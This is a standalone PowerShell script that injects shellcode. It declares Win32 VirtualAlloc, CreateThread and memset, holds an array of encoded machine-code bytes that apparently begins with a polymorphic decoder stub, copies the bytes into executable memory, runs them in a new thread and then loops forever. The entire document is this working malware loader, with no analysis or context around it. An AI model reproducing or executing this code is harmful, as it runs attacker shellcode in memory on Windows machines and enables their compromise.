$bLR3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bLR3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xde,0xbe,0x81,0x0c,0x94,0x7c,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x72,0x18,0x83,0xea,0xfc,0x03,0x72,0x95,0xee,0x61,0x80,0x7d,0x6c,0x89,0x79,0x7d,0x11,0x03,0x9c,0x4c,0x11,0x77,0xd4,0xfe,0xa1,0xf3,0xb8,0xf2,0x4a,0x51,0x29,0x81,0x3f,0x7e,0x5e,0x22,0xf5,0x58,0x51,0xb3,0xa6,0x99,0xf0,0x37,0xb5,0xcd,0xd2,0x06,0x76,0x00,0x12,0x4f,0x6b,0xe9,0x46,0x18,0xe7,0x5c,0x77,0x2d,0xbd,0x5c,0xfc,0x7d,0x53,0xe5,0xe1,0x35,0x52,0xc4,0xb7,0x4e,0x0d,0xc6,0x36,0x83,0x25,0x4f,0x21,0xc0,0x00,0x19,0xda,0x32,0xfe,0x98,0x0a,0x0b,0xff,0x37,0x73,0xa4,0xf2,0x46,0xb3,0x02,0xed,0x3c,0xcd,0x71,0x90,0x46,0x0a,0x08,0x4e,0xc2,0x89,0xaa,0x05,0x74,0x76,0x4b,0xc9,0xe3,0xfd,0x47,0xa6,0x60,0x59,0x4b,0x39,0xa4,0xd1,0x77,0xb2,0x4b,0x36,0xfe,0x80,0x6f,0x92,0x5b,0x52,0x11,0x83,0x01,0x35,0x2e,0xd3,0xea,0xea,0x8a,0x9f,0x06,0xfe,0xa6,0xfd,0x4e,0x33,0x8b,0xfd,0x8e,0x5b,0x9c,0x8e,0xbc,0xc4,0x36,0x19,0x8c,0x8d,0x90,0xde,0xf3,0xa7,0x65,0x70,0x0a,0x48,0x96,0x58,0xc8,0x1c,0xc6,0xf2,0xf9,0x1c,0x8d,0x02,0x06,0xc9,0x38,0x06,0x90,0x32,0x14,0x09,0x42,0xdb,0x67,0x0a,0x93,0x47,0xe1,0xec,0xc3,0x27,0xa1,0xa0,0xa3,0x97,0x01,0x11,0x4b,0xf2,0x8d,0x4e,0x6b,0xfd,0x47,0xe7,0x01,0x12,0x3e,0x5f,0xbd,0x8b,0x1b,0x2b,0x5c,0x53,0xb6,0x51,0x5e,0xdf,0x35,0xa5,0x10,0x28,0x33,0xb5,0xc4,0xd8,0x0e,0xe7,0x42,0xe6,0xa4,0x82,0x6a,0x72,0x43,0x05,0x3d,0xea,0x49,0x70,0x09,0xb5,0xb2,0x57,0x02,0x7c,0x27,0x18,0x7c,0x81,0xa7,0x98,0x7c,0xd7,0xad,0x98,0x14,0x8f,0x95,0xca,0x01,0xd0,0x03,0x7f,0x9a,0x45,0xac,0xd6,0x4f,0xcd,0xc4,0xd4,0xb6,0x39,0x4b,0x26,0x9d,0xbb,0xb7,0xf1,0xdb,0xc9,0xd9,0xc1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$wv8=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($wv8.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$wv8,0,0,0);for (;;){Start-sleep 60};
